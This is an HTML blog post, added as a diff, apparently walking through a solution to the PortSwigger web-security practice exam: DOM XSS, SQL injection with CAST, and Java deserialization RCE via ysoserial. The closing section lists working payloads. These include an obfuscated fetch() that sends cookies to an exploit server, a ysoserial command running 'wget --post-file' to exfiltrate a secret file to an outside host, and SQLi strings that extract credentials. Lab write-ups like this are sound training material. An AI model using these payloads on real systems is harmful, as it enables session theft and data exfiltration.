@@ -1,0 +1,192 @@
+<!doctype html>
+<html lang="en-us"><head>
+    <title>incogbyte&#39;s blog</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=--width, initial-scale=1, shrink-to-fit=no">
+    <meta name="description" content="" />
+
+    
+    
+    
+    <link rel="stylesheet" href="../../css/theme.min.css">
+
+    
+    
+    
+
+    
+</head>
+<body>
+        <div id="content" class="mx-auto"><header class="container mt-sm-5 mt-4 mb-4 mt-xs-1">
+    <div class="row">
+        <div class="col-sm-4 col-12 text-sm-right text-center pt-sm-4">
+            <a href="../../" class="text-decoration-none">
+                <img id="home-image" class="rounded-circle"
+                    
+                        
+                            src="../../images/avatar.png"
+                        
+                    
+                />
+            </a>
+        </div>
+        <div class="col-sm-8 col-12 text-sm-left text-center">
+            <h2 class="m-0 mb-2 mt-4">
+                <a href="../../" class="text-decoration-none">
+                    
+                        incogbyte
+                    
+                </a>
+            </h2>
+            <p class="text-muted mb-1">
+                
+                    incogbyte #:
+                
+            </p>
+            <ul id="nav-links" class="list-inline mb-2">
+                
+                
+                    <li class="list-inline-item">
+                        <a class="badge badge-white " href="../../about/" title="About">About</a>
+                    </li>
+                
+                    <li class="list-inline-item">
+                        <a class="badge badge-white " href="../../" title="Posts">Posts</a>
+                    </li>
+                
+                    <li class="list-inline-item">
+                        <a class="badge badge-white " href="../../cve/" title="CVEs">CVEs</a>
+                    </li>
+                
+            </ul>
+            <ul id="nav-social" class="list-inline">
+                
+                    <li class="list-inline-item mr-3">
+                        <a href="https://github.com/incogbyte" target="_blank">
+                            <i class="fab fa-github fa-1x text-muted"></i>
+                        </a>
+                    </li>
+                
+                    <li class="list-inline-item mr-3">
+                        <a href="https://wwww.linkedin.com/in/rodolfo-augusto-543863a7" target="_blank">
+                            <i class="fab fa-linkedin-in fa-1x text-muted"></i>
+                        </a>
+                    </li>
+                
+                    <li class="list-inline-item mr-3">
+                        <a href="https://twitter.com/incogbyte" target="_blank">
+                            <i class="fab fa-twitter fa-1x text-muted"></i>
+                        </a>
+                    </li>
+                
+                    <li class="list-inline-item mr-3">
+                        <a href="mailto://incogbyte@gmail.com" target="_blank">
+                            <i class="fas fa-at fa-1x text-muted"></i>
+                        </a>
+                    </li>
+                
+                    <li class="list-inline-item mr-3">
+                        <a href="incogbyte" target="_blank">
+                            <i class="fab fa-telegram fa-1x text-muted"></i>
+                        </a>
+                    </li>
+                
+            </ul>
+        </div>
+    </div>
+    <hr />
+</header>
+<div class="container">
+    <div class="pl-sm-4 ml-sm-5">
+        <p>In this blog post, we&rsquo;ll embark on a journey to dissect the solution to a challenging practice exam question provided by PortSwigger. We&rsquo;ll delve deep into the intricacies of web security, emphasizing the critical importance of understanding vulnerabilities, exploitation techniques, and mitigation strategies. By the time you finish reading this article, you&rsquo;ll have gained valuable insights into real-world web security scenarios, equipping yourself with the knowledge required to effectively protect digital assets.</p>
+<p>Before we begin, let&rsquo;s briefly introduce the PortSwigger practice exam. You can find more information about this exam <a href="https://portswigger.net/web-security/certification/practice-exam">here</a>.</p>
+<p>Here&rsquo;s an overview of what the practice exam entails:</p>
+<ul>
+<li>You have a two-hour window to complete the practice exam.</li>
+<li>The exam involves exploiting a single vulnerable application.</li>
+<li>The assessment is divided into three distinct stages:
+<ol>
+<li>Finding the user</li>
+<li>Escalating privileges</li>
+<li>Achieving Remote Code Execution (RCE) or Command Execution</li>
+</ol>
+</li>
+</ul>
+<p>Now, let&rsquo;s delve into the details of each stage, exploring the challenges and solutions that await:</p>
+<h3 id="first-stage-finding-the-user">First Stage: Finding the User</h3>
+<p>The first stage presents a dom-based Cross-Site Scripting (XSS) challenge. However, there are restrictions in place that require creative bypass techniques. We&rsquo;ll walk you through the process of chaining payloads to successfully exploit the vulnerability and retrieve the user token.</p>
+<p><img src="../../images/dom_based_xss_p1.png" alt="XSS Challenge"></p>
+<p>The journey to finding the user token will involve a series of payload chains, as illustrated below:</p>
+<p><img src="../../images/xss_dom_based.png" alt="Payload Chain"></p>
+<p><img src="../../images/Chain_exploit_xss_dom_based.png" alt="Payload Chain2"></p>
+<p>After numerous attempts and perseverance, you&rsquo;ll achieve the desired outcome:</p>
+<p><img src="../../images/exploit_server_xss_dom_based.png" alt="Exploit Success"></p>
+<p><img src="../../images/get_carlos_token.png" alt="Carlos token"></p>
+<p><img src="../../images/carlos_login_page.png" alt="Carlos Page"></p>
+<h3 id="second-stage-sql-injection-and-admin-login">Second Stage: SQL Injection and Admin Login</h3>
+<p>The second stage may seem mundane but proves to be a critical test of your SQL injection skills. You&rsquo;ll need to utilize CAST() clauses to extract the admin password.</p>
+<p>To begin, you&rsquo;ll want to confirm the presence of an SQL error when manipulating the &lsquo;organize_by&rsquo; parameter:</p>
+<p><img src="../../images/sql1.png" alt="SQL Error"></p>
+<p>With some persistence, you&rsquo;ll uncover valuable information:</p>
+<p><img src="../../images/sql2.png" alt="SQL Result"></p>
+<p>You&rsquo;ll gather details such as the database version, user, and password:</p>
+<p><img src="../../images/version_sqli.png" alt="DB Details"></p>
+<p><img src="../../images/administrador_sqli.png" alt="User and Password"></p>
+<p><img src="../../images/password_admin_sqli.png" alt="Password"></p>
+<p><img src="../../images/admin_login_after_sqli.png" alt="Admin Login"></p>
+<p>Delete user carlos :-)</p>
+<p><img src="../../images/delete_carlos_admin.png" alt="Admin Login"></p>
+<p>Completing this stage, you&rsquo;ll have accomplished two major milestones:</p>
+<ol>
+<li>Successful SQL injection</li>
+<li>Admin login credentials</li>
+</ol>
+<h3 id="third-stage-remote-code-execution-via-deserialization">Third Stage: Remote Code Execution via Deserialization</h3>
+<p>In the final stage, you&rsquo;ll log in as the admin and inspect the cookies, specifically looking for a cookie named &lsquo;admin&rsquo; with a known pattern &lsquo;H4sIAAAAAAAAA.&rsquo; This pattern typically signifies a serialized Java string:</p>
+<p><img src="../../images/pyl.png" alt="Payload Generation"></p>
+<p>To achieve Remote Code Execution (RCE) via deserialization, you&rsquo;ll need a tool like <a href="https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar">ysoserial</a>. Following the guidance provided in <a href="https://book.hacktricks.xyz/pentesting-web/deserialization">Hack Tricks</a>, you&rsquo;ll generate a payload.</p>
+<p>Here&rsquo;s a simplified example of a Java URLDNS payload:</p>
+<p><img src="../../images/deser_payload_gen.png" alt="Payload Generation"></p>
+<p>Upon successful payload execution, you&rsquo;ll receive a callback:</p>
+<p><img src="../../images/deser_payload_result.png" alt="Payload Result"></p>
+<p>Next, you&rsquo;ll generate a payload to retrieve the contents of &lsquo;/home/carlos/secret&rsquo;:</p>
+<p><img src="../../images/exploit_payload_deser.png" alt="Exploit Payload"></p>
+<p>And here&rsquo;s the resulting data:</p>
+<p><img src="../../images/exploit_payload_deser_result.png" alt="Exploit Payload Result"></p>
+<p>With this, you&rsquo;ve achieved Remote Code Execution, completing the third stage and ultimately conquering the PortSwigger practice exam.</p>
+<p>To further assist you in your web security endeavors, i&rsquo;ve included some useful payload references and commands below:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>fetch(`https://exploit-0ad000380440d0c28074023d010f00c1.exploit-server.net/exploit/?cookie=` + window[&#34;document&#34;][&#34;cookie&#34;])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ZmV0Y2goYGh0dHBzOi8vZXhwbG9pdC0wYWQwMDAzODA0NDBkMGMyODA3NDAyM2QwMTBmMDBjMS5leHBsb2l0LXNlcnZlci5uZXQvZXhwbG9pdC8/Y29va2llPWAgKyB3aW5kb3dbImRvY3VtZW50Il1bImNvb2tpZSJdKQ==
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&#34;-eval(atob(&#34;ZmV0Y2goYGh0dHBzOi8vZXhwbG9pdC0wYWQwMDAzODA0NDBkMGMyODA3NDAyM2QwMTBmMDBjMS5leHBsb2l0LXNlcnZlci5uZXQvZXhwbG9pdC8/YCArIHdpbmRvd1siZG9jdW1lbnQiXVsiY29va2llIl0p&#34;))-&#34;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>%22%2Deval%28atob%28%22ZmV0Y2goYGh0dHBzOi8vZXhwbG9pdC0wYWQwMDAzODA0NDBkMGMyODA3NDAyM2QwMTBmMDBjMS5leHBsb2l0LXNlcnZlci5uZXQvZXhwbG9pdC8%2FYCArIHdpbmRvd1siZG9jdW1lbnQiXVsiY29va2llIl0p%22%29%29%2D%22
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">location</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;https://0a4a000a04b7d03c805f03c700b000a3.web-security-academy.net/?SearchTerm=%22%2Deval%28atob%28%22ZmV0Y2goYGh0dHBzOi8vZXhwbG9pdC0wYWQwMDAzODA0NDBkMGMyODA3NDAyM2QwMTBmMDBjMS5leHBsb2l0LXNlcnZlci5uZXQvZXhwbG9pdC8%2FYCArIHdpbmRvd1siZG9jdW1lbnQiXVsiY29va2llIl0p%22%29%29%2D%22&#34;</span>
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Example: Java URLDNS Payload</span>
+</span></span><span style="display:flex;"><span>java -jar ysoserial-master-2 URLDNS https://t3x5wb0gfqrahx9rqg52p1s4zv5mthh6.oastify.com | gzip -f | base64 -w0
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Example: Common Utilities</span>
+</span></span><span style="display:flex;"><span>java -jar ysoserial-master-2874a69f61-1.jar CommonsBeanutils1 <span style="color:#e6db74">&#39;wget --post-file /home/carlos/secret t3x5wb0gfqrahx9rqg52p1s4zv5mthh6.oastify.com&#39;</span> | gzip -f | base64 -w0
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#f92672">#</span> Example: <span style="color:#66d9ef">SQL</span> Injection Payloads
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">true</span><span style="color:#f92672">+</span><span style="color:#66d9ef">and</span><span style="color:#f92672">+</span><span style="color:#66d9ef">cast</span>((<span style="color:#66d9ef">select</span><span style="color:#f92672">+</span><span style="color:#66d9ef">version</span>())<span style="color:#66d9ef">as</span><span style="color:#f92672">+</span>boolean)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">true</span><span style="color:#f92672">+</span><span style="color:#66d9ef">and</span><span style="color:#f92672">+</span><span style="color:#66d9ef">cast</span>((<span style="color:#66d9ef">select</span><span style="color:#f92672">+</span>username<span style="color:#f92672">+</span><span style="color:#66d9ef">from</span><span style="color:#f92672">+</span>users<span style="color:#f92672">+</span><span style="color:#66d9ef">limit</span><span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>)<span style="color:#66d9ef">as</span><span style="color:#f92672">+</span>boolean)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">true</span><span style="color:#f92672">+</span><span style="color:#66d9ef">and</span><span style="color:#f92672">+</span><span style="color:#66d9ef">cast</span>((<span style="color:#66d9ef">select</span><span style="color:#f92672">+</span>password<span style="color:#f92672">+</span><span style="color:#66d9ef">from</span><span style="color:#f92672">+</span>users<span style="color:#f92672">+</span><span style="color:#66d9ef">limit</span><span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>)<span style="color:#66d9ef">as</span><span style="color:#f92672">+</span>boolean)
+</span></span></code></pre></div>
+    </div>
+
+    
+
+            </div>
+        </div><footer class="text-center pb-1">
+    <small class="text-muted">
+        
+            &copy; Copyright 2024, incogbyte
+        
+        <br>
+    </small>
+</footer>
+</body>
+</html>
